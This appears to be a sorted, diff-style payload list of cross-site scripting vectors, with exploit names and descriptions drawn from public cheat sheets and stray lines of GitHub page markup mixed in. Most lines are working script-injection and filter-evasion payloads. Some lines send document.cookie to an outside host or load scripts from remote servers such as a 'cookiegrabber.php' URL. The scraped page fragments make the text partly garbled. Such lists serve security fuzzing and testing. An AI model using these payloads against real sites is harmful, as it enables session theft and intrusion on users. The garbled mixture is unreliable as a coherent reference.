+<img src="https://i.imgur.com/bYmdHcX.gif"></img>
+<img src="javascript:document.cookie=true;">
+<img src="javascript:document.vulnerable=true;">
+<img src="livescript:document.cookie=true;">
+<img src="livescript:document.vulnerable=true;">
+<img src="mocha:document.cookie=true;">
+<img src="mocha:document.vulnerable=true;">
+<img src=&{document.cookie=true;};>
+<img src=&{document.vulnerable=true;};>
+<img src=\\?\UNC\\\></style>
+<img src=_ onerror=_>
+<img src=http://127.0.0.1/myspace.asp>
+<img src=http://xerosecurity.com/.testing/xss.png>//INJECTX REMOTE
+<img src=something onauxclick="new Function `al\ert\`xss\``">
+<img src=x onerror="document.location='http:&#x2F;&#x2F;xss.cx'";>
+<img src=x onerror="javascript:window.onerror=alert;throw 1">
+<img src=x onerror=prompt`1`>
+<img srcset=popup=1; onerror=popup=1;>
+<img+src="http://localhost">
+<img/src="mars.png"alt="mars">
+<img/src="xss.png"alt="xss">
+<img/src=q onerror='new Function`al\ert\`1\``'>
+<import namespace="t" implementation="#default#time2">
+<input
+<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
+<input name="injected" value="injected" dirname="password" />
+<input name="password" type="password" value="secret" />
+<input name="secret" type="password">
+<input name="username" value="admin" />
+<input onclick=popup=1; >
+<input onfocus=popup=1; autofocus="x">
+<input srcset=x href=x onclick=popup=1; >
+<input type="file" name="file" id="file" />
+<input type="hidden" class="js-support" name="javascript-support" value="unknown">
+<input type="hidden" class="js-webauthn-support" name="webauthn-support" value="unknown">
+<input type="hidden" name="anon" value=0 />
+<input type="hidden" name="client_id" id="client_id" autocomplete="off" class="form-control" />
+<input type="hidden" name="integration" id="integration" autocomplete="off" class="form-control" />
+<input type="hidden" name="priv" value=0 />
+<input type="hidden" name="type" class="js-site-search-type-field">
+<input type="hidden" name="webauthn-conditional" value="undefined">
+<input type="image" dynsrc="javascript:document.cookie=true;">
+<input type="image" dynsrc="javascript:document.vulnerable=true;">
+<input type="submit" value="trigger xss." />
+<input type="submit">
+<input type="text" name="a"
+<input type="text" name="q" id="not-found-search" class="flex-auto input-lg form-control mr-2">
+<input type="text" value=""onfocus=location='javascript:alert`1`' autofocus""/>
+<input type=text value=“XSS”>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
+<label for="custom_scope_name">Name</label>
+<label for="custom_scope_query">Query</label>
+<label for="login_field">
+<label for="password">
+<label id="query-builder-test-label" for="query-builder-test" class="FormControl-label sr-only">
+<legend id=x form=frm></legend>
+<li >
+<li class="lh-condensed tmp-mb-3">
+<li>
+<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
+<link href="http://host/xss.css">
+<link rel="assets" href="https://github.githubassets.com/">
+<link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
+<link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
+<link rel="dns-prefetch" href="https://github.githubassets.com">
+<link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
+<link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
+<link rel="import" href="//xss.cx">
+<link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">
+<link rel="preconnect" href="https://avatars.githubusercontent.com">
+<link rel="preconnect" href="https://github.githubassets.com" crossorigin>
+<link rel="prefetch" href="http://xss.cx">
+<link rel="stylesheet" href="javascript:document.cookie=true;">
+<link rel="stylesheet" href="javascript:document.vulnerable=true;">
+<link rel=attachment href="file:///etc/passwd">
+<locale-selector>
+<main class="font-mktg " >
+<marquee loop=1 width=0 onfinish=1/confirm`/1/`>0</marquee>
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+<marquee onstart='javascript:confirm&#x28;1&#x29;'>^__^
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+<marquee>Kerala Cyber Force</marquee>
+<math>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<math><a/xlink:href=javascript&colon;confirm&lpar;1&rpar;>click
+<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
+<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
+<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
+<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
+<meta charset="utf-8">
+<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
+<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
+<meta http-equiv="refresh" content="0;url=ms-word:ofe|u|\\SITE/word.docx"/>
+<meta http-equiv="refresh" content="1; url=file:////net/xss.cx/xss.html">
+<meta http-equiv=x-ua-compatible content=ie=8>
+<meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">
+<meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">
+<meta name="color-scheme" content="light dark" />
+<meta name="disable-turbo" content="false">
+<meta name="expected-hostname" content="github.com">
+<meta name="github-keyboard-shortcuts" content="copilot" data-turbo-transient="true" />
+<meta name="hostname" content="github.com">
+<meta name="is_logged_out_page" content="true">
+<meta name="octolytics-page-type" content="marketing" />
+<meta name="octolytics-url" content="https://collector.github.com/github/collect" />
+<meta name="route-action" content="raw" data-turbo-transient>
+<meta name="route-controller" content="blob" data-turbo-transient>
+<meta name="turbo-cache-control" content="no-preview" data-turbo-transient="">
+<meta name="ui-target" content="full">
+<meta name="user-login" content="">
+<meta name="viewport" content="width=device-width">
+<meta property="og:image:height" content="620">
+<meta property="og:image:type" content="image/png">
+<meta property="og:site_name" content="GitHub">
+<meta property="og:url" content="https://github.com">
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:creator" content="github">
+<meta property="twitter:site" content="github">
+<meta property="twitter:title" content="GitHub">
+<nav aria-label="Legal and Resource Links">
+<object allowscriptaccess="always" data="test.swf"></object>
+<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
+<object onfocus=popup=1;>
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+<object/data=//goo.gl/nlX0P>
+<object/data=”//goo.gl/nlX0P”>
+<object/onerror=write`1`//
+<p class="comment" title=""><svg/a="></p>
+<p class="comment" title=""onload='/*"></p>
+<p class="text-small color-fg-muted">
+<p hidden?={{hidden}}>123</p>
+<path d="M8 4a4 4 0 1 1 0 8 4 4 0 0 1 0-8Z"></path>
+<plaintext>
+<pre>
+<react-partial
+<react-partial-anchor>
+<root/>//["'`-->]]>]</div>
+<s "'"="" 000="">
+<sCRIpt x=">" src=//15.rs></script>
+<sCriPt/src=//14.rs?
+<sVg><scRipt >alert&lpar;1&rpar; {Opera}
+<script
+<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
+<script <B>document.vulnerable=true;</script>
+<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
+<script SRC="http://www.securitycompass.com/xss.jpg"></script>
+<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
+<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
+<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
+<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
+<script language=vbs></script><img src=xx:x onerror="::alert' @insertScript '::">
+<script language=vbs>MsgBox 1</script>
+<script src="//brutelogic.com.br&sol;1.js&num;
+<script src="//â’•â‚¨"></script>)
+<script src="//⒕₨"></script>)
+<script src="\\example.com\foo.js"></script> // Safari 5.0//["'`-->]]>]</div>
+<script src="http://192.168.1.6/test.js" ></script>
+<script src="http://code.jquery.com/jquery-1.4.4.js"></script>
+<script src="http://www.evilsite.org/cookiegrabber.php"></script>
+<script src=//brutelogic.com.br/1.js>
+<script src=http://xssor.io/xss.js></SCRIPT>
+<script src=http://yoursite.com/your_files.js></script>
+<script type="application/json" data-target="react-partial.embeddedData">{"props":{}}</script>
+<script type="text/xaml"><Canvas Loaded="confirm" /></script>
+<script type=text/vbscript>msgbox document.location</script> // IE 10
+<script x> alert</script 1=2
+<script/&Tab; src='http://0r.pe' /&Tab;></script>
+<script/src=//6a。lv></script>
+<script/src=//xss.cx>/*
+<script/src=//Ǌ.₨></script>
+<script/src=//⑭.₨>
+<script>
+<script>  src="http://www.site.com/XSS.js"></script>
+<script>_</script>
+<script>``.constructor.constructor`confirm\`1\````</script>
+<script>a=/XSS/\ndocument.vulnerable=true;</script>
+<script>alert`1`</script>
+<script>class a{@alert get}</script>
+<script>d.innerHTML+='';</script>
+<script>d.innerHTML+='';</script>//["'`-->]]>]</div>
+<script>document.body.innerHTML="<h1>XSS-Here</h1>"</script>
+<script>document.cookie=true;//--></script>
+<script>document.vulnerable=true;</script>
+<script>eval.call`${'prompt\x281)'}`</script>
+<script>prompt.call`${1}`</script>
+<script>var i=new Image; i.src="http://192.168.1.6/?"+document.cookie;</script>
+<script>var location={};</script>
+<script>var m=<html><a href="//host">link</a>
+<scrollable-region data-labelled-by="custom-scopes-dialog-title">
+<scrollable-region data-labelled-by="feedback-dialog-title">
+<section class="col-12 col-lg-4 tmp-mb-5 tmp-pr-lg-4">
+<select autofocus onfocus=alert`1`
+<select onclick="popup=1;">
+<select onclick=popup=1;>
+<source onclick=popup=1; ><frameset/onload=popup=1;>
+<span class="ActionList-item-label">
+<span class="Button-label"><div class="HeaderMenu-toggle-bar rounded my-1"></div>
+<span class="Button-label"><span class="locale-selector-trigger">
+<span class="Button-label">or continue with other methods</span>
+<span class="FormControl-inlineValidation--visual">
+<span class="color-fg-muted Link--secondary f6">English</span>
+<span class="d-none">Toggle navigation</span>
+<span class="flex-1" data-target="qbsearch-input.inputButtonText">Search or jump to...</span>
+<span class="sr-only" id="query-builder-test-clear">Clear</span>
+<span class="sr-only">GitHub on Instagram</span>
+<span class="sr-only">GitHub on LinkedIn</span>
+<span class="sr-only">GitHub on TikTok</span>
+<span class="sr-only">GitHub on Twitch</span>
+<span class="sr-only">GitHub on X</span>
+<span class="sr-only">GitHub on YouTube</span>
+<span class="sr-only">GitHub’s organization on GitHub</span>
+<span data-target="query-builder.clearButton" hidden>
+<span></span>
+<span>English</span>
+<span>日本語</span>
+<span>한국어</span>
+<style TYPE="text/javascript">document.vulnerable=true;</style>
+<style type="text/css">
+<style type="text/javascript">document.cookie=true;</style>
+<style type="text/javascript">document.vulnerable=true;</style>
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<style>
+<style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>//["'`-->]]>]</div>
+<style>*[{}@import'test.css?]{color: green;}</style>X
+<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
+<style>@import'http://www.securitycompass.com/xss.css';</style>
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
+<summary role="button" aria-label="Close dialog"></summary>
+<svg
+<svg contentScriptType=text/vbs><script>MsgBox
+<svg contentScriptType=text/vbs><script>MsgBox"@insertScript"<i> #IE9 #svg #vbscript
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<svg contentScriptType=text/vbs><script>XSS
+<svg onclick=popup=1;>
+<svg onload=_>
+<svg onload=alert&#40;1&#41>
+<svg onload=alert&lpar;1&rpar;>
+<svg onload=location='//p0.al'>
+<svg onload=popup=1;>
+<svg+onload=+"[DATA]"
+<svg/language=vbs onload=msgbox-1
+<svg/onload=alert&#40&#41>
+<svg/onload=alert`INJECTX`>
+<svg/onload=location=name//
+<svg/onload=location=name//>
+<svg/onload=location=name//”>CLICK</a>
+<svg/onload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;//
+<svg/onload=prompt&#40;1)
+<svg/onload=setTimeout`alert\`1\``>
+<svg/onload=window.onerror=alert;throw/XSS/;//
+<svg/onload=window.onerror=confirm;throw/5/;//
+<svg/onload=window.onerror=confirm;throw/XSS/;//
+<svg/onload=window.onerror=confirm;throw/XSS/;//"
+<svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>
+<svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>
+<svg:svg>
+<svg><a xyz:href=123><text>test</text></svg>
+<svg><script/href="xss.cx/xss.js"//>
+<svg><script>alert&#40 1&#41
+<svg><script>alert&#40 1&#41<b>
+<svg><script>alert&#40/1/&#41</script>
+<svg><script>alert&DiacriticalGrave;1&DiacriticalGrave;<p>
+<svg><script>alert&grave;1&grave;<p>
+<svg><script>confirm&#40/1/&#41</script>
+<svg><script>confirm&DiacriticalGrave;1&DiacriticalGrave;<p><svg><script>confirm&grave;1&grave;<p>
+<svg><script>prompt&#40 1&#41</script>
+<svg><script>prompt&#40 1&#41<i>
+<svg><script>prompt&#40;1)</script>
+<svg><script>prompt&#40;1)<b>
+<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
+<table BACKGROUND="javascript:document.vulnerable=true;">
+<table><TD BACKGROUND="javascript:document.vulnerable=true;">
+<template class="js-flash-template">
+<template data-target="react-partial-anchor.template">
+<template id="book-icon">
+<template id="bookmark-icon">
+<template id="circle-icon">
+<template id="code-icon">
+<template id="code-review-icon">
+<template id="code-square-icon">
+<template id="codespaces-icon">
+<template id="comment-discussion-icon">
+<template id="comment-icon">
+<template id="copilot-error-icon">
+<template id="copilot-icon">
+<template id="credit-card-icon">
+<template id="device-desktop-icon">
+<template id="device-mobile-icon">
+<template id="file-code-icon">
+<template id="gift-icon">
+<template id="globe-icon">
+<template id="heart-icon">
+<template id="history-icon">
+<template id="issue-opened-icon">
+<template id="organization-icon">
+<template id="package-icon">
+<template id="pencil-icon">
+<template id="play-icon">
+<template id="plus-circle-icon">
+<template id="project-icon">
+<template id="repo-icon">
+<template id="rocket-icon">
+<template id="search-icon">
+<template id="server-icon">
+<template id="shield-check-icon">
+<template id="site-details-dialog">
+<template id="snippet-clipboard-copy-button">
+<template id="snippet-clipboard-copy-button-unpositioned">
+<template id="team-icon">
+<template id="trash-icon">
+<template id="workflow-icon">
+<template match="/">
+<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>
+<title>Page not found · GitHub · GitHub</title>
+<ul
+<ul class="ActionList" id="locale-selector-list" role="menu" aria-labelledby="locale-selector-text">
+<ul class="list-style-none color-fg-muted f5">
+<ul class="list-style-none d-flex flex-items-center lh-condensed-ultra gap-3">
+<ul class="list-style-none d-flex flex-wrap color-fg-muted gapx-3">
+<ul class="list-style-none f5">
+<video onclick=popup=1;>
+<w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
+<x 1="1"onxxx=1
+<x 1=">" onxxx=1
+<x 1='1'onxxx=1
+<x </onxxx=1
+<x OnXxx=1
+<x onxxx=1 onxxx=1
+<x/onxxx=1
+<xml id="X" src="test.htc"></xml><label dataformatas="html" datasrc="#X" datafld="payload"></label>
+<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
+<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
+<xml src="javascript:document.cookie=true;">
+<xml src="javascript:document.vulnerable=true;">
+<xml:namespace prefix="t">
+<xsl:template match="/">
+<xss:xss>XSS</xss:xss>
+<Å¿cript/async/src=//â’›â‚¨>
+<Å¿vg><Å¿cript/href=//â’•â‚¨>
+<ſcript/async/src=//⒛₨>
+<ſvg><ſcript/href=//⒕₨>
+=
+>
+> XSS | Replacive Fuzzers
+>"&<script>document.cookie=true;</script>
+>"&{document.cookie=true;};
+>"'
+>"</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
+>"<<script>document.cookie=true;</script>
+>"<BASE HREF="javascript:document.cookie=true;//">
+>"<BGSOUND SRC="javascript:document.cookie=true;">
+>"<BODY BACKGROUND="javascript:document.cookie=true;">
+>"<BODY ONLOAD=document.cookie=true;>
+>"<BR SIZE="&{document.cookie=true}">
+>"<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
+>"<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
+>"<IMG DYNSRC="javascript:document.cookie=true;">
+>"<IMG LOWSRC="javascript:document.cookie=true;">
+>"<IMG SRC="  javascript:document.cookie=true;">
+>"<IMG SRC="jav ascript:document.cookie=true;">
+>"<IMG SRC="javascript:document.cookie=true;">
+>"<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
+>"<IfRaMe sRc=hTtp://vulnerability-lab.com></IfRaMe>
+>"<LAYER SRC="javascript:document.cookie=true;"></LAYER>
+>"<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
+>"<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
+>"<SCRIPT <B>document.cookie=true;</SCRIPT>
+>"<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>
+>"<SCRIPT>document.cookie=true;//<</SCRIPT>
+>"<SCRIPT>document.cookie=true;</SCRIPT>
+>"<STYLE TYPE="text/javascript">document.cookie=true;</STYLE>
+>"<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
+>"<TABLE BACKGROUND="javascript:document.cookie=true;">
+>"<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
+>"<a href="about:<script>document.cookie=true;</script>">
+>"<a href="javascript#document.cookie=true;">
+>"<bgsound src="javascript:document.cookie=true;">
+>"<body onload="document.cookie=true;">
+>"<div onmouseover="document.cookie=true;">
+>"<iframe src="javascript:document.cookie=true;>
+>"<iframe src=http://vulnerability-lab.com/>@gmail.com
+>"<img dynsrc="javascript:document.cookie=true;">
+>"<img src="blah"onmouseover="document.cookie=true;">
+>"<img src="blah>" onmouseover="document.cookie=true;">
+>"<img src="javascript:document.cookie=true;">
+>"<img src="livescript:document.cookie=true;">
+>"<img src="mocha:document.cookie=true;">
+>"<img src=&{document.cookie=true;};>
+>"<input type="image" dynsrc="javascript:document.cookie=true;">
+>"<link rel="stylesheet" href="javascript:document.cookie=true;">
+>"<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
+>"<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+>"<script>document.cookie=true;//--></script>
+>"<style type="text/javascript">document.cookie=true;</style>
+>"<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
+>"<xml src="javascript:document.cookie=true;">
+>"¼script¾document.cookie=true;¼/script¾
+></div>
+></ghcc-consent>
+></ul>
+><object+data=//14.rs>
+><script src=//pastebin.com/raw/WDWWYaLA></script>
+><script>
+><script>1<\\/script>
+><script>X<\/script>
+>>This is a comment line to be changed in the future
+>test-->
+?url=ws://example.com/
+@import:_
+@irsdl challenge result:
+A
+A collection of XSS Attack vectors
+A very short cross browser header injection
+Add onclick event hadler
+Advanced HTML injection locator
+Advanced XSS Locator
+Advanced XSS Locator for title-Injections
+Author Name: -unknown-
+Author Name: .mario
+Author Name: DoctorDan
+Author Name: OWASP
+Author Name: PHPIDS Group
+Author Name: SIrDarckCat
+Author Name: ha.ckers.org
+Author Name: kishor
+Author Name: ma1
+Author Name: thespanner.co.uk
+Author Name: xs-sniper
+Author URL: http://sirdarckcat.net/
+B
+BASE
+BGSOUND
+BODY ONLOAD
+BODY background-image
+Backslash-obfuscated XBL injection - variant 1
+Backslash-obfuscated XBL injection - variant 2
+Backslash-obfuscated XBL injection - variant 3
+Backslash-obfuscated XBL injection - variant 4
+Backslash-obfuscated XBL injection - variant 5
+Basic JS breaker
+Basic JS breaker variant 1
+Basic JS breaker variant 10
+Basic JS breaker variant 2
+Basic JS breaker variant 3
+Basic JS breaker variant 4
+Basic JS breaker variant 5
+Basic JS breaker variant 6
+Basic JS breaker variant 7
+Basic JS breaker variant 8
+Basic JS breaker variant 9
+Basic back ticked attribute breaker
+Basic double quoted attribute breaker
+Basic single quoted attribute breaker
+Basic title breaker
+Bypass IE all version flash docuemnt object protection  by @gainover1
+Bypass IE8 flash docuemnt object protection  by @irsdl
+Bypass IE8 version flash docuemnt object protection  by @jackmasa
+Bypass IE9 flash docuemnt object protection  by @irsdl
+CACACACACACACACACACACACACACACACA
+Camouflaged comment injection with JS link
+Case Insensitive
+Character Encoding Example
+Clipboard-hijack without script and css: http://<bdo dir=rtl>elgoog</bdo>.com
+Closing JS Tag in JS String assignment
+Comment-breaker using obfuscated JavaScript
+Commented-out Block
+Company
+Conditional style injection for IE
+Content Replace
+Cookie Manipulation
+DIV background-image 1
+DIV background-image 2
+DIV expression
+DIV w/Unicode
+DOM clobbering:<form name=document><image name=body> clobbered document->body
+DOM clobbering:<form name=location > clobbered location object on IE.
+Data URl
+Do not share my personal information
+Double open angle brackets
+Dword Encoding
+Ecosystem
+Embed Flash
+Embedded Carriage Return
+Embedded Encoded Tab
+Embedded Newline
+Embedded Tab
+End title tag
+Escaping JavaScript escapes
+Evade Regex Filter 1
+Evade Regex Filter 2
+Evade Regex Filter 3
+Evade Regex Filter 4
+Evade Regex Filter 5
+Eval string contained in name property
+Exploit Description: Advanced XSS Locator
+Exploit Description: BGSOUND
+Exploit Description: BODY image
+Exploit Description: Basic injection attack
+Exploit Description: Can be used when JS can be injected directly.
+Exploit Description: Case insensitive XSS attack vector.
+Exploit Description: Concatenates fragmented functions to evakuate the location hash
+Exploit Description: Div background-image
+Exploit Description: Embedded tab to break up the cross site scripting attack.
+Exploit Description: IMG Dynsrc
+Exploit Description: IMG Lowsrc
+Exploit Description: INPUT Image
+Exploit Description: Image XSS using the JavaScript directive.
+Exploit Description: JS breaker for literal objects with double quoted string properties.
+Exploit Description: JS breaker for literal objects with single quoted string properties.
+Exploit Description: JS literal object breaker for integer properties.
+Exploit Description: No quotes and no semicolon
+Exploit Description: No single quotes or double quotes or semicolons.
+Exploit Description: STYLE tag using background-image.
+Exploit Description: STYLE tag using background.
+Exploit Description: Shuffled and obfuscated function calls
+Exploit Description: Stylesheet
+Exploit Description: TD background.
+Exploit Description: The vector incudes a binding file via injected style attrbute. Gecko only.
+Exploit Description: This aim-uri executes the calc.exe on vulnerable systems
+Exploit Description: This basic vector breaks HTML titles and injects JavaScript.
+Exploit Description: This can be used when input is concatenated in JavaScript.
+Exploit Description: This extremely short XSS vector works only when newlines can be injected.
+Exploit Description: This injects VB code and produces a message box. IE only.
+Exploit Description: This navigatorurl-uri executes the cmd.exe on vulnerable systems.
+Exploit Description: This res-uri can be used to probe for certain software in IE.
+Exploit Description: This super basic vector breaks HTML attributes
+Exploit Description: This time $ is used to obfuscate the self-executing payload trigger.
+Exploit Description: This vector assembles an alert which will be fired using the URL property.
+Exploit Description: This vector breaks HTML quotes and comments.
+Exploit Description: This vector breaks JS integer assignments in arrays.
+Exploit Description: This vector breaks JS integer assignments.
+Exploit Description: This vector breaks JS when embedded in single quoted arrays.
+Exploit Description: This vector breaks JS when placed in double quoted arrays.
+Exploit Description: This vector breaks back ticked attributes.
+Exploit Description: This vector breaks double quoted URL input
+Exploit Description: This vector breaks double quoted attributes and produces an alert.
+Exploit Description: This vector breaks single quoted URL input
+Exploit Description: This vector breaks single quoted attributes and appends an alert.
+Exploit Description: This vector concatenates a string and evaluates it via mapping on URL
+Exploit Description: This vector concatenates a string and evaluates it via self-execution.
+Exploit Description: This vector creates an UXSS via firefoxurl:
+Exploit Description: This vector creates an alert by breaking multiline comments.
+Exploit Description: This vector creates an alert like message boy via Visual Basic Script
+Exploit Description: This vector ends styleblocks and uses obfuscated JavaScript to create an alert.
+Exploit Description: This vector indicates HTML injections by stroked text.
+Exploit Description: This vector is a basic URL breaker - embedding an alert in a URL-like wrapper.
+Exploit Description: This vector just fits between script tags and fires an alerts.
+Exploit Description: This vector uses XML predicate properties to activate its payload.
+Exploit Description: This vector uses line breaks to obfuscate and evaluates the location hash.
+Exploit Description: This vector utilized back ticks as attribute delimiters. This works only in IE.
+Exploit Description: This vector utilizes an urlencoded JS image source to create an alert.
+Exploit Description: This vector utilizes the feature of CSS expressions in IE.
+Exploit Description: This vector utilizes whitespace to obfuscate and contains a JS link.
+Exploit Description: Using this action script inside flash can obfuscate your XSS vector.
+Exploit Description: VBscript in an image
+Exploit Description: XML namespace. The .htc file must be located on the server as your XSS vector.
+Exploit Name: A very short cross browser header injection
+Exploit Name: Add onclick event hadler
+Exploit Name: Advanced HTML injection locator
+Exploit Name: Advanced XSS Locator
+Exploit Name: Advanced XSS Locator for title-Injections
+Exploit Name: BASE
+Exploit Name: BGSOUND
+Exploit Name: BODY ONLOAD
+Exploit Name: BODY background-image
+Exploit Name: Backslash-obfuscated XBL injection - variant 1
+Exploit Name: Backslash-obfuscated XBL injection - variant 2
+Exploit Name: Backslash-obfuscated XBL injection - variant 3
+Exploit Name: Backslash-obfuscated XBL injection - variant 4
+Exploit Name: Backslash-obfuscated XBL injection - variant 5
+Exploit Name: Basic JS breaker
+Exploit Name: Basic JS breaker variant 1
+Exploit Name: Basic JS breaker variant 10
+Exploit Name: Basic JS breaker variant 2
+Exploit Name: Basic JS breaker variant 3
+Exploit Name: Basic JS breaker variant 4
+Exploit Name: Basic JS breaker variant 5
+Exploit Name: Basic JS breaker variant 6
+Exploit Name: Basic JS breaker variant 7
+Exploit Name: Basic JS breaker variant 8
+Exploit Name: Basic JS breaker variant 9
+Exploit Name: Basic back ticked attribute breaker
+Exploit Name: Basic double quoted attribute breaker
+Exploit Name: Basic single quoted attribute breaker
+Exploit Name: Basic title breaker
+Exploit Name: Camouflaged comment injection with JS link
+Exploit Name: Case Insensitive
+Exploit Name: Character Encoding Example
+Exploit Name: Closing JS Tag in JS String assignment
+Exploit Name: Comment-breaker using obfuscated JavaScript
+Exploit Name: Commented-out Block
+Exploit Name: Conditional style injection for IE
+Exploit Name: Content Replace
+Exploit Name: Cookie Manipulation
+Exploit Name: DIV background-image 1
+Exploit Name: DIV background-image 2
+Exploit Name: DIV expression
+Exploit Name: DIV w/Unicode
+Exploit Name: Double open angle brackets
+Exploit Name: Dword Encoding
+Exploit Name: Embed Flash
+Exploit Name: Embedded Carriage Return
+Exploit Name: Embedded Encoded Tab
+Exploit Name: Embedded Newline
+Exploit Name: Embedded Tab
+Exploit Name: End title tag
+Exploit Name: Escaping JavaScript escapes
+Exploit Name: Evade Regex Filter 1
+Exploit Name: Evade Regex Filter 2
+Exploit Name: Evade Regex Filter 3
+Exploit Name: Evade Regex Filter 4
+Exploit Name: Evade Regex Filter 5
+Exploit Name: Eval string contained in name property
+Exploit Name: Extra dot for Absolute DNS
+Exploit Name: Extraneous Open Brackets
+Exploit Name: FRAME
+Exploit Name: Filter Evasion 1
+Exploit Name: Filter Evasion 2
+Exploit Name: Firefox Lookups 1
+Exploit Name: Firefox Lookups 2
+Exploit Name: Firefox Lookups 3
+Exploit Name: Grave Accents
+Exploit Name: HTML Entities
+Exploit Name: HTML Quoute & Comment breaker
+Exploit Name: HTML wrapped in XML
+Exploit Name: Half-Open HTML/JavaScript
+Exploit Name: Hex Encoding
+Exploit Name: Hex Encoding w/out Semicolons
+Exploit Name: IE VB Messagebox injection
+Exploit Name: IE backticked semicolon injection
+Exploit Name: IE closing-tag expression injection
+Exploit Name: IE expression injection
+Exploit Name: IFRAME
+Exploit Name: IMG Dynsrc
+Exploit Name: IMG Embedded commands 1
+Exploit Name: IMG Embedded commands 2
+Exploit Name: IMG Lowsrc
+Exploit Name: IMG No Quotes/Semicolon
+Exploit Name: IMG STYLE w/expression
+Exploit Name: IMG w/JavaScript Directive
+Exploit Name: IMG w/VBscript
+Exploit Name: INPUT Image
+Exploit Name: IP Encoding
+Exploit Name: Image onerror wrapped in XML statement
+Exploit Name: Image tag with obfuscated JS URI
+Exploit Name: Image w/CharCode
+Exploit Name: JS link with whitespace obfuscation
+Exploit Name: JS string concatenation breaker
+Exploit Name: JSON based obfuscated onload vector
+Exploit Name: JSON based onload vector
+Exploit Name: JSON based semicolon-onload vector
+Exploit Name: JavaScript Includes
+Exploit Name: JavaScript Link Location
+Exploit Name: JavaScript concatenation vector variant 1
+Exploit Name: JavaScript concatenation vector variant 2
+Exploit Name: JavaScript concatenation vector variant 3
+Exploit Name: JavaScript concatenation vector variant 4
+Exploit Name: JavaScript concatenation vector variant 5
+Exploit Name: JavaScript concatenation vector variant 6
+Exploit Name: JavaScript concatenation vector variant 7
+Exploit Name: JavaScript-breaker using carriage return
+Exploit Name: LAYER
+Exploit Name: List-style-image
+Exploit Name: Livescript
+Exploit Name: Local .htc file
+Exploit Name: Long UTF-8 Unicode w/out Semicolons
+Exploit Name: META
+Exploit Name: META w/additional URL parameter
+Exploit Name: META w/data:URL
+Exploit Name: Malformed IMG Tags
+Exploit Name: Markup breaker with special quotes
+Exploit Name: Mixed Encoding
+Exploit Name: Mocha
+Exploit Name: Mozilla -moz-binding-url injection
+Exploit Name: Mozilla -moz-binding-url injection - filter evading
+Exploit Name: Multiline selfcontained XSS
+Exploit Name: Multiline w/Carriage Returns
+Exploit Name: Name contained XSS variant 1
+Exploit Name: Name contained XSS variant 2
+Exploit Name: Name contained XSS variant 3
+Exploit Name: Name contained XSS variant 4
+Exploit Name: No Closing Script Tag
+Exploit Name: No Quotes/Semicolons
+Exploit Name: Non-Alpha/Non-Digit
+Exploit Name: Non-Alpha/Non-Digit Part 2
+Exploit Name: Noscript-breaker with mouseover
+Exploit Name: Null Chars 1
+Exploit Name: Null Chars 2
+Exploit Name: OBJECT
+Exploit Name: OBJECT w/Embedded XSS
+Exploit Name: OBJECT w/Flash 2
+Exploit Name: Obfuscated DOM element creation
+Exploit Name: Obfuscated JS image source
+Exploit Name: Obfuscated XML predicate vector variation 1
+Exploit Name: Obfuscated XML predicate vector variation 2
